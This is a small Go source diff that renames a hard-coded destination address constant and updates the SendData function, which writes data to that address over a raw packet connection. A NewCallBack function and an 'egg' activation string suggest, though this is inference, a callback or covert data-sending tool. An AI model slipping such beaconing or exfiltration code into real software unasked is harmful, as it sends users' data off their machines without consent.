@@ -30,7 +30,7 @@ import (
 const (
 	// To be used as an egg later
 	//secretMessage = "Activate"
-	targetIP = "10.10.100.199"
+	serverIP = "10.10.100.199"
 )
 
 func NewCallBack() {
@@ -87,7 +87,7 @@ func SendData(data string, seq int) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
+	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(serverIP)}); err != nil {
 		log.Fatalf("WriteTo err, %s", err)
 	}
 
